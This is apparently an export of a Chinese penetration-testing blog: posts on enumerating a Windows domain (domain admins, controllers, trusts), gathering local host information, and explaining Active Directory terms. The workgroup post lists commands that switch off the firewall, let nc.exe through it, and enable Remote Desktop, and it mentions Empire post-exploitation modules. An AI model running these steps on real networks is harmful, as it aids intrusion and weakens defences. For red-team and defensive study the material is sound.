src="/2022/10/13/Intra-domain_information_collection/1665303846049-dbf18c49-6245-4240-a739-e7dbedc63fea.png" alt="image.png"></p><ul><li>判断主域</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303931947-0bf1e5c6-b1f9-46be-ba38-3ffd82085bea.png" alt="image.png"></p><h3 id="收集域内基础信息">收集域内基础信息</h3><ul><li>查看域</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><ul><li>查看域内计算机</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:domain_name</span><br></pre></td></tr></table></figure><ul><li>查看域内用户组列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665303685975-daa91283-3d11-4fcc-8c3a-78caa70581c8.png" alt="image.png"></p><ul><li>查看域用户组信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Enterprise Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304025868-53b09d01-c2fd-4487-af0e-7fea3a90e897.png" alt="image.png"></p><ul><li>查看域密码策略信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304059956-323a4cdd-f0e6-47cf-a121-59755776408b.png" alt="image.png"></p><ul><li>查看域信任信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304109275-c8f0067a-017a-498d-978c-f3962ac88ca7.png" alt="image.png"></p><h3 id="收集域用户和管理员信息">收集域用户和管理员信息</h3><ul><li>查询域用户列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304170728-669ac8ea-d8ec-4a3b-995a-e2ac68a8f7dc.png" alt="image.png"></p><ul><li>查询域用户详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><ul><li>查询存在的用户，dsquery命令需要在域控上运行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304508449-4870f9b9-de10-4d99-bd8d-f7677255f724.png" alt="image.png"><br>常用的 dsquery 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer - 查找目录中的计算机</span><br><span class="line">dsquery contact - 查找目录中的联系人</span><br><span class="line">dsquery subnet - 查找目录中的子网</span><br><span class="line">dsquery group - 查找目录中的组</span><br><span class="line">dsquery ou - 查找目录中的组织单位</span><br><span class="line">dsquery site - 查找目录中的站点</span><br><span class="line">dsquery server - 查找目录中的域控制器</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery quota - 查找目录中的配额</span><br><span class="line">dsquery partition - 查找目录中的分区</span><br><span class="line">dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304613101-cfb585e7-4e5a-47e2-9135-17b870810511.png" alt="image.png"></p><p><img src="/2022/10/13/Intra-domain_information_collection/1665304745790-12d460b6-132b-4817-aa4d-2846c651bc6e.png" alt="image.png"></p><h3 id="查找域控制器">查找域控制器</h3><ul><li>查看域控器机器名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /DCLIST:fzm.com</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304872563-8496491f-bbdb-41b4-a1a5-4f62692f57dc.png" alt="image.png"></p><ul><li>查看域控器主机名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665305173306-40fede56-3fbd-4e66-98de-4492579b3dca.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc   //需要在域控上执行</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665304977673-5f9ec9f2-e393-4f94-8d1e-2ab2812e3ac7.png" alt="image.png"></p><ul><li>查看域控器组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665305257385-be808558-2986-4b33-87d2-3a15003202ef.png" alt="image.png"></p><h3 id="查找域管理员进程">查找域管理员进程</h3><ul><li>获取域管理员列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/2022/10/13/Intra-domain_information_collection/1665383177494-e4ffdfc1-234e-4f76-bd0f-22ec5f147e6e.png" alt="image.png"></p><ul><li>列出本机的所有进程及进程用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地工作组信息收集</title>
      <link href="/2022/10/12/Working_Group_Information_Gathering/"/>
      <url>/2022/10/12/Working_Group_Information_Gathering/</url>
      
        <content type="html"><![CDATA[<h3 id="手动收集本地工作组信息">手动收集本地工作组信息</h3><ul><li>查看当前权限</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><ul><li>本机网络配置信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><ul><li>操作系统和版本信息（英文版）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure><ul><li>操作系统和版本信息（中文版）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><ul><li>查看系统体系结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><ul><li>查看系统所有环境变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set</span><br></pre></td></tr></table></figure><ul><li>查看安装的软件及版本和路径等信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><ul><li>利用 PowerShell 收集软件版本信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><ul><li>查询本机服务信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><ul><li>查询进程列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><ul><li>wmic 查看进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><ul><li>查看启动程序信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><ul><li>查看计划任务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><ul><li>查看主机开启时间</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><ul><li>查询用户列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><ul><li>查看指定用户的信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><ul><li>查看本地管理员用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><ul><li>查看当前在线用户</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><ul><li>列出或断开本地计算机和连接的客户端的会话</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><ul><li>查看端口列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat –ano</span><br></pre></td></tr></table></figure><ul><li>查看补丁列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><ul><li>使用 wmic 查看补丁列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><ul><li>查看本机共享</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><ul><li>使用 wmic 查看共享列表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><ul><li>查询路由表及所有可用接口的ARP 缓存表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp –a</span><br></pre></td></tr></table></figure><ul><li>查询防火墙相关配置<ul><li>关闭防火墙</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)</span><br><span class="line">netsh advfirewall set allprofiles state off    (Windows Server 2003 系统及之后版本)</span><br></pre></td></tr></table></figure><ul><li>查看防火墙配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><ul><li>修改防火墙配置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(Windows Server 2003 系统及之前版本)</span><br><span class="line">允许指定程序全部连接</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line"></span><br><span class="line">(Windows Server 2003 之后系统版本)</span><br><span class="line">允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;</span><br><span class="line"></span><br><span class="line">允许 3389 端口放行</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><ul><li>自定义防火墙日志储存位置</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log</span><br></pre></td></tr></table></figure><ul><li>查看计算机代理配置情况</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><ul><li>查询并开启远程连接服务<ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h3 id="自动收集本地工作组信息">自动收集本地工作组信息</h3><ul><li>wmic脚本</li></ul><p><a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">wmic 脚本下载地址</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><ul><li>PowerShsell Empire</li></ul><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</li><li>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</li></ul><p>当使用 Empire 使主机上线后，可调用powershell/situational_awareness/host/winenum模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p>调用powershell/situational_awareness/host/computerdetails模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><div id="posts-calendar" class="js-pjax"></div>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网中常见名词解释</title>
      <link href="/2022/10/11/Explanatio_of_common_terms_in_the_intranet/"/>
      <url>/2022/10/11/Explanatio_of_common_terms_in_the_intranet/</url>
      
        <content type="html"><![CDATA[<h3 id="工作组">工作组</h3><p><strong>工作组</strong> Work Group 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。<br>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。<br>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。<br>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。<br>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h3 id="域-domain">域 domain</h3><p>可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。<br>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller">域控制器 Domain Controller</h3><p>简写为 DC，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。<br>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。<br>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。<br>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域">父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树">域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。<br>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，<a href="http://xn--child-mt3iw1h.Microsoft.com">如域child.Microsoft.com</a> 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。<br>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。<br>多个域树可以组成一个域林。</p><h3 id="域林">域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。<br>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道<strong>Kerberos信任关系</strong>，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.<br><a href="http://xn--benet-gv5ij80i.com.cn">比如benet.com.cn</a>,<a href="http://xn--accp-k84fzc0jl1d32ova062c9jy86gfdifv7a053c.com.cn">则可以创建同属与一个林的accp.com.cn</a>,他们就在同一个域林里.<br>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。<br>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><h3 id="活动目录">活动目录</h3><p>活动目录 Active Directory ，简写为 AD，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。<br>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。<br>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h3 id="DMZ">DMZ</h3><p>DMZ demilitarized zone ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。<br>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><h3 id="域内的各种权限">域内的各种权限</h3><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。<br><strong>域本地组</strong><br>成员范围：所有的域；使用范围：自己所在的域<br><strong>全局组</strong><br>成员范围：自己所在的域；使用范围：所有的域<br><strong>通用组</strong><br>成员范围：所有的域；使用范围：所有的域<br><strong>A-G-DL-P 策略</strong><br>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 杂七杂八 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
